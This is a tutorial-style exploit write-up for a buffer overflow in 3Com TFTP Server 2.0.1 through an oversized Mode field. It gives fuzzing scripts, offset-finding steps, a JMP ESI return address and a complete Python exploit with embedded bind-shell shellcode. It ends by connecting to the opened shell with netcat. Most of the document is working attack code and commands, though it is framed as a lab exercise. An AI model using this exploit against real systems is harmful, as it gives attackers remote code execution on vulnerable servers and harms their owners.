Exploit for:
3Com TFTP Server Version 2.0.1

Description: 
We can trigger a buffer overflow through the Mode string in our TFTP request.

Discovered by:
Liu Qixu

Written by:
Jean Gonzalez
https://github.com/Jean13

Tested in: Windows XP SP2 and Windows XP SP3.

08/09/2016

Exploit Steps:

1) Download and install 3Com TFTP server version 2.0.1 on a machine running Windows XP.

2) Download and install Immunity Debugger on the same machine.

3) Understand how a proper TFTP packet looks like.

 2 bytes     string   1 byte  string  1 byte
------------------------------------------------
| Opcode |  Filename  |  0  |  Mode  |  0  |
------------------------------------------------ 

Notice that we can control the Filename field and the Mode field.
By reading TFTP's RFC, we know that supported modes include netascii, octet, and mail. This means that developers expect eight characters or less for the Mode field. This is where we attack.

4) Understand what Opcodes look like.

Opcode    Operation
---------------------------
01     Read request (RRQ)
02     Write request (WRQ)
03     Data (DATA)
04     Acknowledgment (ACK)
05     Error (ERROR)

5) In your Linux machine:
cat > 3Com_Fuzzer_step1.py
#!/usr/bin/python
import socket

# First set of A's
buffer_array = ["\x41" * 100]
addition = 200

# Appending fuzzing strings in increments of 100
while len(buffer_array) <= 50:
	buffer_array.append("\x41" * addition)
	addition += 100

# Sending each element of the array in the Mode field
for value in buffer_array:
	# Using mode 02 (write request). The A's go in the mode field.
	tftp_packet = "\x00\x02" + "Coconut" + "\x00" + value + "\x00"
	print "Fuzzing with length " + str(len(value))
	
	# Setting up UDP socket
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.sendto(tftp_packet,('192.168.1.22',69))

	response = s.recvfrom(2048)
	print response

6) Copy the 3CTftpSvc and 3CTftpSvcCtrl files to C:\WINDOWS.

7) Double-click on 3CTftpSvcCtrl and click on 'Install Service' -> 'Start Service' -> Quit.

8) Attach to the 3CTftpSvc process in Immunity Debugger and run.

9) In your Linux machine: python 3Com_Fuzzer_step1.py

10) You will notice in your console that the TFTP server freezes at 600. This means that 500 A's crashed the server. 
If you look at the Registers pane in Immunity Debugger, you will see that EIP was overwritten with A's. 
You can also see that ESP was overwritten with A's as well.
This all means that by sending a string of 500 characters in the Mode field, we can 
control execution and the contents of some memory registers.

10) In Immunity Debugger: !mona pattern_create 500

11) In your Linux machine:
cp 3Com_Fuzzer_step1.py 3Com_Fuzzer_step2.py

11) Copy the ASCII pattern from C:\logs\3CTftpSvc\pattern.txt into the exploit in place of the A's.

vi 3Com_Fuzzer_step2.py
#!/usr/bin/python
import socket

# The pattern we created using !mona pattern_create 500
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# Using mode 02 (write request). The pattern goes in the mode field.
tftp_packet = "\x00\x02" + "Coconut" + "\x00" + buffer + "\x00"
	
# Setting up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftp_packet,('192.168.1.22',69))

response = s.recvfrom(2048)
print response

12) Double-click on 3CTftpSvcCtrl and click on'Start Service' to restart it.

13) Attach to the 3CTftpSvc process in Immunity Debugger and run.

14) On your Linux machine: 
python 3Com_Fuzzer_step2.py

15) In Immunity Debugger, notice in the 'Registers' section that ESI points to the beginning of our pattern.
Also notice what EIP points at. In my case it is: 00A5F402

16) In your Linux machine:
cd /usr/share/metasploit-framework/tools/exploit/
./pattern_offset.rb -q 00A5F402 -l 500

17) Notice the output of step #16. In my case it was 473.
This is the space we can work with. The offset is at 473, so that is where we will put our JMP ESI.

18) Repeat steps #12 and #13.

19) In Immunity Debugger, type: !mona jmp -r esi -m user32
We are using one of the OS's dll's. 
Notice in Immunity Debugger's Log Data window that the JMP ESI instruction is at address 7E45AE4E.

20) In your Linux machine:
cp 3Com_Fuzzer_step2.py 3Com_Fuzzer_step3.py

21) In your Linux machine:
msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f ruby

22) Copy the output of step #21.

23) In your Linux machine:
vi 3Com_Fuzzer_step3.py
#!/usr/bin/python
import socket, struct

# Encoder: x86/shikata_ga_nai
# Payload size: 355 bytes
# Payload: windows/shell_bind_tcp
shellcode = ("\xba\x4d\x36\x92\x3a\xd9\xc5\xd9\x74\x24\xf4\x5b\x29\xc9" +
"\xb1\x53\x83\xeb\xfc\x31\x53\x0e\x03\x1e\x38\x70\xcf\x5c" +
"\xac\xf6\x30\x9c\x2d\x97\xb9\x79\x1c\x97\xde\x0a\x0f\x27" +
"\x94\x5e\xbc\xcc\xf8\x4a\x37\xa0\xd4\x7d\xf0\x0f\x03\xb0" +
"\x01\x23\x77\xd3\x81\x3e\xa4\x33\xbb\xf0\xb9\x32\xfc\xed" +
"\x30\x66\x55\x79\xe6\x96\xd2\x37\x3b\x1d\xa8\xd6\x3b\xc2" +
"\x79\xd8\x6a\x55\xf1\x83\xac\x54\xd6\xbf\xe4\x4e\x3b\x85" +
"\xbf\xe5\x8f\x71\x3e\x2f\xde\x7a\xed\x0e\xee\x88\xef\x57" +
"\xc9\x72\x9a\xa1\x29\x0e\x9d\x76\x53\xd4\x28\x6c\xf3\x9f" +
"\x8b\x48\x05\x73\x4d\x1b\x09\x38\x19\x43\x0e\xbf\xce\xf8" +
"\x2a\x34\xf1\x2e\xbb\x0e\xd6\xea\xe7\xd5\x77\xab\x4d\xbb" +
"\x88\xab\x2d\x64\x2d\xa0\xc0\x71\x5c\xeb\x8c\xb6\x6d\x13" +
"\x4d\xd1\xe6\x60\x7f\x7e\x5d\xee\x33\xf7\x7b\xe9\x34\x22" +
"\x3b\x65\xcb\xcd\x3c\xac\x08\x99\x6c\xc6\xb9\xa2\xe6\x16" +
"\x45\x77\x92\x1e\xe0\x28\x81\xe3\x52\x99\x05\x4b\x3b\xf3" +
"\x89\xb4\x5b\xfc\x43\xdd\xf4\x01\x6c\xf0\x58\x8f\x8a\x98" +
"\x70\xd9\x05\x34\xb3\x3e\x9e\xa3\xcc\x14\xb6\x43\x84\x7e" +
"\x01\x6c\x15\x55\x25\xfa\x9e\xba\xf1\x1b\xa1\x96\x51\x4c" +
"\x36\x6c\x30\x3f\xa6\x71\x19\xd7\x4b\xe3\xc6\x27\x05\x18" +
"\x51\x70\x42\xee\xa8\x14\x7e\x49\x03\x0a\x83\x0f\x6c\x8e" +
"\x58\xec\x73\x0f\x2c\x48\x50\x1f\xe8\x51\xdc\x4b\xa4\x07" +
"\x8a\x25\x02\xfe\x7c\x9f\xdc\xad\xd6\x77\x98\x9d\xe8\x01" +
"\xa5\xcb\x9e\xed\x14\xa2\xe6\x12\x98\x22\xef\x6b\xc4\xd2" +
"\x10\xa6\x4c\xe2\x5a\xea\xe5\x6b\x03\x7f\xb4\xf1\xb4\xaa" +
"\xfb\x0f\x37\x5e\x84\xeb\x27\x2b\x81\xb0\xef\xc0\xfb\xa9" +
"\x85\xe6\xa8\xca\x8f")

# Padding.
nops = "\x41" * 118

# Packs the address in little-endian.
# JMP ESI from USER32.dll
esi = struct.pack('<I', 0x7E45AE4E)

buffer = shellcode + nops + esi

# Using mode 02 (write request). 
tftp_packet = "\x00\x02" + "Coconut" + "\x00" + buffer + "\x00"
	
# Setting up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftp_packet,('192.168.1.22',69))

response = s.recvfrom(2048)
print response

24) Repeat steps #12 and #13.

25) In your Linux machine: 
python 3Com_Fuzzer_step3.py

26) In your Linux machine:
nc 192.168.1.22 4444

Congratulations! You just build yet another working exploit.


